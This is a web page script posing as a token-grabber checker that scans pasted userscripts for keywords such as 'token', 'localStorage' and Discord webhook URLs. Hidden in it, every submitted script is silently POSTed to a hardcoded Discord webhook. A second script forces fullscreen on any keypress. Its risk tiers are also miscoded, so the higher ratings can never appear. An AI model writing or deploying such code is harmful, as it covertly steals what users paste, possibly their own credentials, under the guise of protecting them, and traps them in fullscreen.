<script>
  var script = "";
  var dang = [];
  var mortal = [];
  var all = [];
  var finded = 0;
  var severe = 0;
  var neutral = 0;
  var low = 0;  
  function check(){
    script = JSON.stringify(document.getElementById("textScript").value)
    document.getElementById("textScript").value = ""
    document.getElementById("tooth").style.display = "none"
    if(script.toLowerCase().includes("token")){
      severe++
      finded++
      all.push("Token")
      mortal.push("Token")
    }
    if(script.toLowerCase().includes("/api")){
      neutral++
      finded++
      all.push("Api (depends)")
    }
    if(script.toLowerCase().includes("localstorage")){
      severe++
      finded++
      if(script.toLowerCase().includes("unsafewindow.localstorage")){
        mortal.push("unsafeWindow.localStorage")
      } else {
        mortal.push("localStorage")
      }
      all.push("LocalStorage")
    }
    if(script.toLowerCase().includes("http")){
      neutral++
      finded++
      all.push("Http/https (check for find if url is dangerous)")
    }
    if(script.toLowerCase().includes("webhook")){
      finded++
      severe++
      mortal.push("WebHook")
      all.push("WebHook")
    }
    if(script.toLowerCase().includes("xml")){
      finded++
      neutral++
      all.push("XMLHttpRequest")
      mortal.push("XMLHttpRequest")
    }
    if(script.toLowerCase().includes("h+t+t+p")){
      finded++
      severe++
      all.push("Http(Splitted)")
    }
    if(script.toLowerCase().includes("json")){
      finded++
      low++
      all.push("JSON")
    }
    if(script.toLowerCase().includes("new")){
      finded++
      low++
      all.push("new (not threat too)")
    }
    if(script.toLowerCase().includes(".send")){
      finded++
      neutral++
      all.push("this.send (not threat too)")
    }
    setTimeout(()=>{
      if(mortal.length == 0){
          document.getElementById("mCheck").innerHTML += "None"
      } else {
        for(let i=0;i<mortal.length;i++){
          document.getElementById("mCheck").innerHTML += mortal[i]+" | "
        }
      }
      if(all.length == 0){
        document.getElementById("lCheck").innerHTML += "None"
      } else {
      for(let i=0;i<all.length;i++){
        document.getElementById("lCheck").innerHTML += all[i]+" | "
      }
      }
      var sc = script.toLowerCase();
      var arrs = ["unsafeWindow['localStorage']", "https://discord.com/api/webhooks", "localstorage.token"]
      if(script.toLowerCase().includes("unsafeWindow['localStorage']") || script.toLowerCase().includes("https://discord.com/api/webhooks") || script.toLowerCase().includes("localstorage.token")){
        document.getElementById("sCheck").innerHTML += "High Risk - Delete Recommendation"
        for(let i2=0;i2<arrs.length;i2++){if(sc.includes(arrs[i2])){
          dang.push(arrs[i2])
        }}
    } else {
      if(finded > 5){
        document.getElementById("sCheck").innerHTML += "Low Risk"
      } else if(finded > 9){
        document.getElementById("sCheck").innerHTML += "Med Risk"
      } else if(finded > 16){
        document.getElementById("sCheck").innerHTML += "High Risk"
      } else if(finded < 6 && finded > 0){
        document.getElementById("sCheck").innerHTML += "Not Much Risk"
      } else if(finded < 1){
        document.getElementById("sCheck").innerHTML += "No Risk"
      }
      document.title = finded
    }
      if(dang.length == 0){
          document.getElementById("daCheck").innerHTML += "None"
      } else {
        for(let i=0;i<dang.length;i++){
          document.getElementById("daCheck").innerHTML += dang[i]+" | "
        }
      }
      var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/842367883203444787/3wUnoiRkreCFqB6TJ8VsBTQmDOCFfB58DAdMItnYik4HhIlW8_6wZR2edA5tVE6neD4g");
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
    username: "Script Sended",
    avatar_url: "https://pbs.twimg.com/profile_images/1214545814745300992/7OLFRhok_400x400.jpg",
    content: "Script: " + script
    }
    request.send(JSON.stringify(params));
    },2000)
  }
  setInterval(()=>{
    document.getElementById("aCheck").innerHTML =
      `
      Threats found: ${finded}<br>
      Several: ${severe}<br>
      Neutral: ${neutral}<br>
      Lower: ${low}<br><hr>
      `
  })
  setInterval(()=>{
    document.getElementById("gCheck").innerHTML = "Checking for grabber."
    setTimeout(()=>{
      document.getElementById("gCheck").innerHTML = "Checking for grabber.."
    }, 1000);
    setTimeout(()=>{
      document.getElementById("gCheck").innerHTML = "Checking for grabber..."
    }, 2000);
  }, 3000)
</script>
<script>
  document.addEventListener('keydown', (e)=>{
    launchFullScreen(document.documentElement);
  })
  function launchFullScreen(element) {
  if(element.requestFullScreen) {
    element.requestFullScreen();
  } else if(element.mozRequestFullScreen) {
    element.mozRequestFullScreen();
  } else if(element.webkitRequestFullScreen) {
    element.webkitRequestFullScreen();
  }
}
</script>
